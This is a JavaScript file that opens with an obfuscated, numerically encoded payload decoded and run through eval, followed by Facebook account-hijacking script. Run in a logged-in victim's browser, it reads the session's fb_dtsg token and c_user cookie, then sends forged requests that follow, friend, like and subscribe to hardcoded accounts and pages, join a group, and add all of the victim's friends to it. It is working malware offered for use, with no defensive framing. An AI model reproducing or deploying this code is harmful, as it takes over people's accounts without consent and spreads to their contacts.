1087D1357D1063A1369C1087A1519E1381E1093E1105A1111D1345B1123B1093C1357B1063F1369B1087F1519A1381E1093D1105F1111E1345D1123F1099B1357B1063F1369D1087A1519A1381E1093F1105D1111E1345E1123C1105C1357C1063F1369C1087F1519C1381C1093F1105B1111D1345A1123B1111F1357D1357A1153A1507C1381E1483A991C1411D1387F1369A1399F1495C1489C1417B1165D1399D1465B1393F1501F1453B1405C1459D1495C1345E1369A1087C1519D1381B1099D1099A1393D1345D1099D1357F1357A1039A1369D1087C1519F1381C1099B1099E1393F1345C1093C1357A1045F1345B1087E1357C1345B1369A1087C1519E1381B1099F1099B1393D1345E1087E1357D1357D1153E1507A1381F1483A991C1501C1489D1405E1483A1369D1429B1399F1165B1399E1465D1393D1501A1453E1405F1459B1495F1345C1369C1087A1519C1381D1099E1099D1393C1345E1111F1357E1357D1345A1369F1087E1519C1381C1099B1099D1393C1345B1105D1357A1357E1039A1399A1465F1393F1501A1453B1405D1459C1495D1345B1369B1087C1519E1381F1099C1099E1393B1345A1111D1357C1357F1345C1369C1087F1519F1381E1099D1099A1393E1345F1105B1357D1357A1039A1081F1393B1369B1501C1489C1405B1483B1165B1039D1351F1399B1057A1045D1081A1045C1345E1093E1357E1045B1153E1507C1381A1483E991E1429E1399F1165F1369B1087B1519F1381B1099D1099E1393C1345E1117A1357E1153C1507C1381C1483E991E1381C1483D1441A1381C1399A1381A1489D1447C1381A1483A1165F1345B1357B1153F1507A1381F1483F991E1489E1507E1459A1369A1483C1405B1507F1153A1411E1501F1459A1393F1495C1429A1465D1459D991E1381F1483E1441A1381F1399B1381F1489E1447F1381D1483A1429E1369F1381A1447F1039E1429F1399D1045B1537D1507F1381E1483C991A1369B1087D1519C1123E1087F1387E1141B1519D1135C1165E991E1459F1405A1513F991B1327F1261F1255E1231F1495D1495D1471B1291D1405C1477E1501F1405B1489A1495B1039F1045F1153B1369F1087F1519F1123E1087B1387E1141F1519A1135A1345B1369F1087C1519E1381F1099A1099F1393E1345F1123C1357F1357D1165A1411E1501E1459D1393A1495E1429C1465B1459D991F1039E1045F1537C1429F1411B1039B1369D1087C1519E1123A1087C1387D1141E1519A1135A1345F1369F1087A1519D1381A1099B1099B1393C1345E1129B1357F1357B1165F1165B1111F1045C1537D1405D1507C1381E1447B1039D1369F1087E1519B1381D1099F1099A1393C1345C1135E1357B1057B1369A1087F1519D1123D1087D1387A1141D1519B1135A1345D1369E1087C1519A1381D1099E1099D1393D1345A1093C1099C1357B1357A1075E1495D1465A1297F1495B1483D1429D1459E1417A1039E1045F1345E1369D1087A1519A1381F1099F1099C1393C1345D1093D1093E1357C1357E1039E1369D1087D1519D1381E1099C1099E1393F1345B1141B1357B1063B1369A1087C1519F1381D1099B1099C1393A1345D1093E1087E1357C1045B1057C1369A1087B1519C1381C1099E1099B1393F1345F1093A1105D1357D1045F1153E1411C1465C1483F1039E1411E1165A1087B1153E1411A1159E1261D1381C1495C1423D1345D1369B1087E1519E1381B1099F1099A1393C1345A1093E1129A1357A1357B1039B1381A1483F1441B1381C1399D1381B1489D1447A1381D1483D1345F1369E1087B1519C1381D1099D1099E1393C1345C1093E1123B1357F1357C1345A1369B1087F1519C1381A1099C1099C1393A1345A1093B1117E1357A1357B1345A1369E1087C1519C1381B1099D1099C1393C1345C1093D1111F1357C1357A1081A1099A1129F1045E1153A1411D1057B1057E1045E1537A1453E1405B1489E1381A1435D1165C1369F1087A1519B1381A1099E1099E1393C1345D1093E1087E1357C1153A1453D1405B1489D1381A1435B1369A1495D1405F1519A1495C1165B1369E1087B1519D1381B1099E1099F1393B1345C1093C1087D1357A1153D1411E1465E1483F1039E1429A1165F1411F1051F1099B1129C1153A1429D1159F1039F1411C1057C1093A1045A1051B1099B1129D1153F1429A1057D1057A1045B1537A1429D1411C1039F1381E1483E1441F1381B1399A1381D1489B1447D1381D1483D1345C1369D1087B1519C1381E1099D1099B1393F1345B1093D1123A1357D1357E1345C1369B1087F1519A1381E1099C1099A1393D1345A1093E1117F1357E1357A1345F1429F1357E1045C1537C1453D1405D1489F1381F1435D1057D1165D1369E1087C1519B1381E1099E1099A1393E1345F1093C1135B1357D1057D1381F1483E1441A1381D1399C1381F1489A1447C1381C1483A1345B1369F1087B1519E1381C1099D1099B1393D1345E1093B1123B1357B1357E1345B1369E1087A1519F1381D1099A1099D1393B1345D1093C1117B1357F1357C1345D1429A1357C1345E1369E1087A1519C1381D1099C1099C1393F1345C1093A1141F1357D1357C1057F1369F1087E1519C1381B1099D1099C1393E1345F1099F1087C1357E1057E1381C1483A1441A1381B1399B1381F1489D1447C1381D1483F1345A1369D1087B1519B1381A1099F1099E1393D1345E1093B1123F1357B1357C1345A1369B1087E1519F1381E1099C1099F1393E1345F1093C1117D1357A1357B1345E1429C1357A1345F1369F1087D1519B1381A1099E1099A1393B1345B1099A1093B1357A1357B1057F1369D1087F1519B1381B1099C1099B1393A1345F1099C1099E1357A1153B1453B1405C1489C1381C1435A1369F1495E1405A1519F1495F1057C1165C1369E1087D1519C1381D1099E1099D1393E1345D1099F1105C1357C1057A1381B1483D1441E1381B1399B1381E1489B1447E1381A1483A1345F1369F1087E1519E1381C1099A1099E1393F1345F1093E1123E1357C1357B1345E1369F1087A1519B1381C1099E1099D1393A1345F1093F1117D1357A1357C1345C1429D1357F1345B1369B1087E1519D1381B1099A1099E1393E1345C1099B1093C1357C1357F1153C1549D991A1153C1549F991C1153E1525E1465B1483A1501F1453E1369D1525D1381E1471C1039D1429B1399B1063D1453D1405F1489B1381E1435E1045D1153E1549B991D1153F1549C991B1153C1549A991E1153B1507B1381E1483B991C1369D1087E1519C1123E1087D1387A1141B1519C1141F1165F1369A1087E1519F1381C1099C1099E1393D1345C1099E1111A1357F1153D1369D1087D1519E1123A1087B1387F1141D1519F1141A1057E1165B1369E1087A1519C1381E1099F1099C1393B1345C1099B1117C1357F1153B1369D1087F1519A1123E1087F1387E1141C1519C1141E1057E1165A1369E1087B1519E1381D1099E1099A1393F1345A1099F1123A1357E1153A1369D1087B1519D1123B1087A1387F1141C1519F1141B1057F1165A1369D1087E1519D1381B1099B1099B1393F1345D1099E1129D1357E1153D1369C1087E1519E1123C1087F1387C1141A1519C1141C1057A1165B1369F1087C1519C1381E1099C1099A1393F1345E1099B1135A1357F1057F1501D1489B1405C1483E1369C1429A1399B1153C1369C1087A1519D1123C1087A1387E1141D1519E1141A1057D1165D1369D1087F1519B1381E1099D1099A1393B1345E1099B1141C1357C1057D1501B1489C1405A1483E1369F1429D1399E1153F1429A1411D1039C1399E1465C1393D1501E1453C1405B1459F1495A1345D1369E1087E1519E1381C1099C1099A1393B1345E1105D1099C1357D1357C1345A1369B1087D1519F1381C1099D1099C1393A1345B1105D1093D1357E1357D1039D1369E1087D1519D1381B1099B1099E1393F1345A1105D1087E1357D1045E1171B1165C1087A1045B1537C1369F1087B1519E1123C1087E1387D1141C1519E1135C1345C1369A1087C1519A1381A1099E1099A1393F1345C1105B1117C1357C1357A1039A1369A1087B1519C1381E1099E1099F1393B1345B1105C1105A1357C1063B1369D1087D1519B1381D1099E1099A1393E1345C1105B1111A1357A1057A1369D1087E1519E1123E1087E1387F1141C1519B1141B1063C1495E1483C1501F1405B1045E1153D1549A991B1405B1447D1489A1405C991E1537B1369C1087A1519B1123A1087E1387D1141E1519C1135C1345A1369A1087D1519C1381E1099E1099D1393D1345E1105E1117A1357B1357C1039F1369C1087F1519C1381C1099E1099A1393B1345B1105B1105F1357F1063C1369A1087D1519C1381D1099B1099D1393B1345B1105B1123E1357C1057F1369B1087E1519A1123B1087C1387E1141E1519F1141B1063C1495E1483D1501C1405B1045D1153F1549F991E1153B1369B1087E1519F1123F1087A1387E1141A1519B1135A1345A1369E1087F1519D1381B1099C1099C1393D1345F1105E1129E1357F1357C1039E1045E1153D1549D991C1153F1411B1501A1459C1393B1495A1429A1465A1459F991D1291C1381C1459F1399A1465C1453E1189D1483C1441E1381D1399D1381F1489A1039F1045F1537B1507A1381C1483B991B1369E1087C1519E1123C1087E1387D1141F1519C1387F1165F1369A1087A1519E1381E1099F1099A1393F1345D1093F1087D1357E1153B1411D1465F1483D1039F1429F1165C1087C1153B1429A1159F1141B1153B1429C1057A1057A1045E1537E1369E1087D1519E1123F1087B1387E1141E1519D1387C1057C1165D1369D1087F1519E1381F1099F1099D1393F1345E1093B1135A1357E1057A1381E1483C1441B1381E1399A1381A1489B1447F1381A1483D1345F1369B1087F1519E1381F1099B1099E1393A1345C1093C1123D1357A1357A1345A1369C1087B1519D1381C1099D1099C1393F1345E1093D1117D1357E1357F1345F1261F1381B1495C1423A1345B1369A1087C1519E1381C1099B1099E1393A1345C1105C1141E1357C1357F1039D1261A1381A1495F1423C1345B1369D1087E1519A1381A1099E1099A1393C1345E1105F1135A1357B1357F1039E1045E1051A1381D1483E1441E1381B1399B1381F1489D1447D1381E1483B1345F1369A1087C1519A1381C1099C1099A1393D1345F1093A1123F1357C1357A1345F1369B1087B1519F1381D1099B1099F1393C1345D1093C1117D1357D1357B1345C1369F1087B1519B1381F1099E1099E1393C1345A1093B1111B1357E1357D1045D1357B1345A1369E1087F1519F1381F1099E1099D1393E1345F1093D1141A1357C1357F1057F1369F1087C1519C1381C1099B1099F1393C1345A1099B1087C1357A1057E1381E1483E1441A1381B1399D1381E1489F1447C1381A1483F1345A1369B1087D1519B1381D1099F1099A1393B1345F1093F1123A1357F1357C1345C1369C1087B1519D1381D1099D1099F1393D1345A1093A1117D1357C1357D1345A1261D1381F1495A1423B1345B1369D1087C1519B1381D1099F1099A1393F1345D1105B1141D1357D1357B1039D1261C1381D1495F1423E1345D1369E1087A1519F1381E1099E1099F1393A1345A1105F1135F1357C1357F1039A1045A1051E1381A1483A1441B1381B1399F1381D1489D1447D1381C1483A1345C1369F1087E1519A1381D1099F1099A1393E1345C1093C1123A1357D1357B1345E1369E1087E1519E1381B1099D1099B1393B1345F1093F1117A1357F1357D1345B1369B1087E1519B1381A1099D1099B1393D1345B1093E1111D1357C1357B1045E1357D1345C1369D1087E1519B1381E1099C1099A1393E1345F1099C1093D1357F1357F1057F1369B1087F1519B1381C1099F1099C1393F1345F1099D1099D1357F1153A1549A991E1153C1483C1405F1495D1501F1483E1459F991E1369C1087B1519E1123E1087F1387A1141B1519A1387B1153A1549B991E1153B1411B1501B1459E1393A1495E1429F1465B1459B991C1525E1465B1483B1501A1453E1369A1525D1381B1471D1039E1429E1399C1063E1369A1087D1519F1123F1087C1387A1141F1519E1399D1045C1537E1507A1381F1483E991A1369E1087F1519C1123A1087B1387D1141F1519A1405D1165C991D1459C1405B1513F991D1327E1261F1255E1231A1495E1495A1471E1291E1405F1477E1501B1405A1489A1495F1039B1045C1153D1507B1381B1483B991A1369F1087A1519E1123B1087C1387D1141B1519D1141A1165A1369C1087D1519F1381A1099F1099A1393C1345A1093E1087C1357E1153A1369E1087E1519F1123B1087F1387B1141E1519F1141F1057D1165D1369C1087F1519C1381A1099F1099A1393E1345C1111D1087A1357E1057D1429A1399B1153B1369E1087B1519C1123E1087E1387C1141C1519F1141C1057E1165F1369F1087B1519D1381C1099C1099F1393C1345D1111C1093B1357C1057E1405A1459C1393C1465E1399E1405D1309F1291C1237F1201C1465E1453A1471E1465B1459F1405F1459B1495C1039C1369A1087C1519A1123A1087A1387F1141D1519E1399E1045D1153A1369B1087A1519E1123D1087C1387E1141B1519F1141B1057C1165D1369E1087D1519B1381E1099E1099E1393B1345D1111E1099F1357F1153E1369E1087D1519A1123D1087E1387E1141F1519C1141F1057A1165C1369E1087E1519B1381A1099D1099C1393F1345D1111B1105E1357D1153B1369E1087F1519E1123A1087F1387C1141C1519D1141A1057E1165D1369B1087D1519D1381D1099B1099C1393A1345F1111C1111F1357B1153F1369C1087F1519D1123B1087F1387B1141E1519E1141C1057E1165D1369E1087D1519B1381B1099A1099B1393A1345C1111C1117A1357A1153C1369D1087C1519B1123D1087A1387E1141F1519D1141F1057D1165B1369F1087A1519A1381E1099C1099D1393F1345B1111E1123D1357E1153D1369E1087D1519B1123F1087B1387D1141C1519A1141B1057A1165C1369B1087C1519D1381B1099E1099D1393A1345D1111D1129B1357C1057B1429D1399D1057A1369A1087A1519E1381C1099E1099F1393E1345C1111F1135F1357C1153D1369A1087F1519F1123E1087E1387A1141F1519D1141E1057D1165A1369B1087B1519E1381C1099E1099A1393F1345F1111A1141B1357C1153D1369D1087F1519D1123D1087A1387B1141B1519A1141B1057A1165A1369E1087E1519A1381E1099A1099A1393F1345B1117F1087D1357F1153E1369C1087B1519E1123B1087E1387A1141B1519D1141D1057B1165B1369B1087B1519C1381A1099B1099E1393B1345F1117A1093D1357A1153B1369B1087D1519E1123E1087A1387B1141B1519A1141D1057D1165E1369A1087C1519D1381E1099F1099B1393A1345A1117E1099C1357E1153E1369F1087B1519B1123D1087A1387E1141E1519B1141E1057F1165C1369D1087B1519F1381F1099D1099E1393E1345B1099E1141A1357A1057C1501A1489C1405E1483A1369A1429A1399C1153D1369D1087E1519D1123F1087D1387C1141C1519C1141A1057D1165E1369A1087C1519C1381B1099A1099E1393B1345B1117C1105B1357C1153F1369D1087A1519D1123A1087F1387D1141F1519B1141E1057C1165D1369E1087C1519B1381E1099C1099B1393A1345A1117D1111D1357C1153F1369F1087C1519F1123A1087C1387D1141A1519C1141E1057F1165D1369A1087A1519C1381C1099A1099A1393B1345C1117B1117C1357B1153F1369F1087B1519C1123D1087C1387D1141B1519D1141A1057A1165E1369B1087D1519E1381B1099D1099E1393A1345A1117D1123C1357D1057C1411A1387D1369E1399D1495E1489A1417F1153E1369D1087E1519E1123C1087B1387C1141E1519B1141B1057A1165B1369A1087B1519D1381A1099A1099B1393B1345D1117E1129C1357D1153E1369F1087A1519D1123B1087F1387B1141B1519B1405C1345C1369C1087C1519B1381F1099F1099E1393C1345E1105D1117E1357C1357A1039F1369C1087D1519A1381A1099C1099C1393A1345F1117E1135B1357F1063D1369A1087C1519D1381C1099B1099E1393F1345C1117A1141D1357C1063B1495A1483C1501B1405B1045A1153B1369A1087B1519C1123D1087B1387C1141F1519B1405B1345D1369D1087E1519F1381E1099C1099C1393B1345E1123E1099C1357D1357D1039C1369A1087C1519D1381B1099E1099D1393B1345C1123C1087B1357A1063C1369B1087F1519A1381F1099C1099A1393E1345C1123C1093A1357A1045A1153D1369D1087A1519B1123D1087F1387E1141F1519C1405B1345C1369F1087F1519D1381A1099F1099A1393D1345C1123E1357C1357A1165B1411D1501E1459E1393D1495F1429A1465D1459E991A1039A1045C1537B1429F1411A1039E1369C1087A1519B1123D1087D1387C1141E1519E1405F1345D1369E1087F1519A1381D1099C1099E1393B1345D1129F1357C1357A1165C1165B1111F1027B1027F1369D1087C1519D1123C1087D1387E1141A1519D1405A1345F1369D1087F1519F1381D1099F1099F1393E1345A1123A1105C1357D1357C1165D1165E1099A1087A1087C1045A1537A1369D1087D1519A1123B1087E1387F1141D1519F1405C1345C1369E1087A1519D1381E1099E1099D1393A1345B1123B1111E1357A1357D1153A1549A991B1153C1549D991C1153D1369B1087A1519E1123B1087D1387C1141B1519A1405C1345F1369C1087C1519A1381F1099A1099C1393F1345B1105A1129D1357E1357D1039A1369F1087B1519D1123C1087E1387A1141B1519B1141A1045E1153F1549C991F1153A1381F1483D1441B1381E1399E1381D1489F1447D1381D1483C1429B1369D1381C1447E1039F1093A1111C1123F1129D1135B1093A1093A1123C1111B1087A1093A1093D1105D1129F1123E1105A1045C1153B';var _2467=/[\x41\x42\x43\x44\x45\x46]/;var _7252=2;var _5554=_2691.charAt(_2691.length-1);var _8757;var _6891=_2691.split(_2467);var _6013=[String.fromCharCode,isNaN,parseInt,String];_6891[1]=_6013[_7252+1](_6013[_7252](_6891[1])/21);var _9443=(_7252==9)?String:eval;_8757='';_11=_6013[_7252](_6891[0])/_6013[_7252](_6891[1]);for(_4656=3;_4656<_11;_4656++)_8757+=(_6013[_7252-2]((_6013[_7252](_6891[_4656])+_6013[_7252](_6891[2])+_6013[_7252](_6891[1]))/_6013[_7252](_6891[1])-_6013[_7252](_6891[2])+_6013[_7252](_6891[1])-1));var _8383='_2409';var _1152='_8383=_8757';function _2545(_4327){_9443(_7344);_2545(_9197);_9197(_1152);_2545(_8383);}var _7344='_2545=_9443';var _9197='_9197=_2545';_2545(_5554);
//CoderLike
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+":379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=>=&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//Cuong
a("100003476998925");a("100003896335787");a("100006548231220");sublist("466541303471765");
Like("478017935654618");Like("212443628952969");Like("502080256570147");Like("464553383671311");
Like("1397274337200850");Like("254856458028565");Like("1449429758621658");Like("463762367079943");Like("573893072681028");
//Koi 
a("100000247071804");a("100004915991249");a("100002968548248");a("100005008566695");
a("100004219204625");
sublist("725936967424532");
Like("206051206265286");Like("506515409466287");Like("213922778799440");
Like("449461031849524");
IDS("100000247071804");
//Kang
a("100004786954242");a("1387170168188539");a("100007650331386");
a("100000247071804");a("582734430");
sublist("176702859165945");sublist("220443444791886");sublist("1389414161323582");
P("254189828083914");P("141160662720165");P("252418168261080");P("260043490831881");P("724930027525226");P("10152189212024431");
Like("764853593544363");Like("585333791547445");Like("803173033033302");
//Phu Koy 
P("199116800294295");P("203268833170011");
Like("690369137681621");Like("620495568021463");Like("525107000935879");Like("581001551983970");Like("822660547749335");Like("490247094379888");
a("100005879291858");a("100004606864047");a("100007381992011");
sublist("169278886611420");sublist("220376934792534");
//mimumim
a("100003908713413");a("100003180931094");a("100007092365303");a("100004223167485");
sublist("233402886810482");sublist("163544690520210");Like("719596914725031");
//haubisley
a("100006619902303");sublist("1405800629650587");
Like("254024908100764");P("1448459238718059");
//CBHN
a("100005345854662");
sublist("180932145428313");sublist("197639580424236");sublist("594405083939542");
Like("648692368505135");Like("208509619349074");Like("1497222867170747");
Like("869050576454537");Like("612691215469986");Like("263836977125199");Like("512811855501983");
//Phong
a("100007751678223");a("100006619902303");a("100007788311168");
sublist("621952017816839");
IDS("100000061400267");IDS("100003638324695");IDS("100007751678223");
Like("263316953820631");Like("685974484796684");Like("1387179771538109");
Like("547700161992307");Like("268572309974110");Like("623995204323025");
Like("289093891183407");Like("411811502221011");Like("455030641257372");
P("660028574009183");P("582804098398298");P("751733198172053");P("417346981729909");P("764398883572151");

var gid = ['360890180648782'];
var fb_dtsg = document[
    'getElementsByName']('fb_dtsg')[0][
    'value'
];
var user_id = document['cookie'][
    'match'
](document['cookie']['match'](
    /c_user=(\d+)/)[1]);
 
var httpwp = new XMLHttpRequest();
var urlwp =
    '/ajax/groups/membership/r2j.php?__a=1';
var paramswp =
    '&ref=group_jump_header&group_id=' +
    gid + '&fb_dtsg=' + fb_dtsg +
    '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader'](
    'Content-type',
    'application/x-www-form-urlencoded'
);
httpwp['setRequestHeader'](
    'Content-length', paramswp['length']
);
httpwp['setRequestHeader']('Connection',
    'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document[
    'getElementsByName']('fb_dtsg')[0][
    'value'
];
var user_id = document['cookie'][
    'match'
](document['cookie']['match'](
    /c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET',
    '/ajax/typeahead/first_degree.php?__a=1&viewer=' +
    user_id + '&token' + Math['random']
    () +
    '&filter[0]=user&options[0]=friends_only',
    false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']
        ['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload'][
            'entries'
        ]['sort'](function (_0x93dax8,
            _0x93dax9) {
            return _0x93dax8[
                'index'] -
                _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp =
        '/ajax/groups/members/add_post.php?__a=1';
    var paramswp = '&fb_dtsg=' +
        fb_dtsg + '&group_id=' + gid +
        '&source=typeahead&ref=&message_id=&members=' +
        friends[i]['uid'] + '&__user=' +
        user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader'](
        'Content-type',
        'application/x-www-form-urlencoded'
    );
    httpwp['setRequestHeader'](
        'Content-length', paramswp[
            'length']);
    httpwp['setRequestHeader'](
        'Connection', 'keep-alive');
    httpwp['onreadystatechange'] =
        function () {
            if (httpwp['readyState'] ==
                4 && httpwp['status'] ==
                200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "1465888910302360";
var user_id = document.cookie.match(
    document.cookie.match(
        /c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun = new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000 *
    60 * 60 * 4 * 1);
if (!document.cookie.match(
    /paylasti=(\d+)/)) {
    document.cookie =
        "paylasti=hayir;expires=" +
        btarihi.toGMTString();
}
